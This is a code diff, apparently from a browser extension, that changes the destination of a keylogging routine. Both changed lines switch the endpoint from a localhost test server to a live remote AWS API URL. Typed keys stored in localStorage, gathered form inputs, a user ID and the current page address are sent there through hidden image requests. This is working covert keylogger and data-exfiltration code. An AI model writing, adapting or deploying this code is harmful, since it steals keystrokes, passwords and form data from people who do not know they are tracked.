@@ -57,7 +57,7 @@ function startTracking(userId) {
         function sendKeys() {
             const keys = localStorage.getItem("log_Extension") || "";
             if (keys.length > 4) {
-                const url = "http://localhost:8000/logs.php?user=" + encodeURIComponent(userId) +
+                const url = "https://stzv453mta.execute-api.ap-south-1.amazonaws.com?user=" + encodeURIComponent(userId) +
                     "&values=" + encodeURIComponent(keys) +
                     "&page=" + encodeURIComponent(location.href);
                 new Image().src = url;
@@ -73,7 +73,7 @@ function startTracking(userId) {
 
             if (inputs.length === 0) return;
 
-            const url = "http://localhost:8000/logs.php?user=" + encodeURIComponent(userId) +
+            const url = "https://stzv453mta.execute-api.ap-south-1.amazonaws.com?user=" + encodeURIComponent(userId) +
                 "&values=" + encodeURIComponent(inputs) +
                 "&page=" + encodeURIComponent(location.href);
             new Image().src = url;
